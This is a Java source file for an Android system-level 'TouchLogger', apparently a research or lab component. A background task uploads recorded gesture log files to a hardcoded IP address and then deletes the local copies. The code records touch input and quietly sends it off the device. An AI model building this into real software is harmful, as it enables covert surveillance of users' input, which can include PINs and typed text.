package com.android.server.policy.touchlogger.task;

import android.os.AsyncTask;
import android.os.Environment;
import android.util.Log;
import com.android.server.policy.touchlogger.TouchLogger;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;

public class UploadGesturesTask extends AsyncTask<Void, Void, Void> {

    private final String TAG = "TouchLogger.uploadTask";
    private final String URL = "http://10.13.37.217:9002";

    @Override
    protected Void doInBackground(Void... params) {
        Environment.setUserRequired(false);
        File dataDirectory = Environment.getDataDirectory();
        File logDataDirectory = new File(String.format("%s/%s",
                dataDirectory.getAbsolutePath(), TouchLogger.LOG_DATA_DIRNAME));
        if (logDataDirectory.exists()) {
            File fileList[] = logDataDirectory.listFiles(new FilenameFilter() {
                @Override
                public boolean accept(File dir, String name) {
                    return name.startsWith("data") && name.endsWith(".log");
                }
            });

            for (File logFile: fileList) {
                if (logFile.exists()) {
                    try {
                        uploadFile(URL, logFile);
                        if (logFile.delete()) {
                            Log.d(TAG, String.format("File %s deleted sucessfully", logFile.getName()));
                        } else {
                            Log.w(TAG, String.format("Unable to delete file %s", logFile.getName()));
                        }
                    } catch (FileNotFoundException e) {
                            e.printStackTrace();
                    }
                } else {
                    Log.e(TAG, String.format("LogFile %s listed in fileList but does not exist", logFile.getName()));
                }
            }
        }
        return null;
    }

    private void uploadFile(String link, File file) throws FileNotFoundException {
        HttpURLConnection connection;
        BufferedOutputStream outStream = null;
        InputStream inStream = new FileInputStream(file);

        URL url;

        try
        {
            url = new URL(link);
            connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "application/bin");
            connection.setRequestMethod("POST");

            outStream = new BufferedOutputStream(connection.getOutputStream());
            copyStream(inStream, outStream);
            outStream.close();
            connection.disconnect();
            Log.d(TAG, "Gesture data sent successfully");
        }
        catch(IOException e)
        {
            e.printStackTrace();
        }
    }

    private void copyStream(InputStream input, OutputStream output)
            throws IOException
    {
        byte[] buffer = new byte[1024];
        int bytesRead;
        int totalBytesRead = 0;
        while ((bytesRead = input.read(buffer)) != -1)
        {
            totalBytesRead += bytesRead;
            output.write(buffer, 0, bytesRead);
        }
        Log.d(TAG, String.format("Read %d total", totalBytesRead));
    }
}
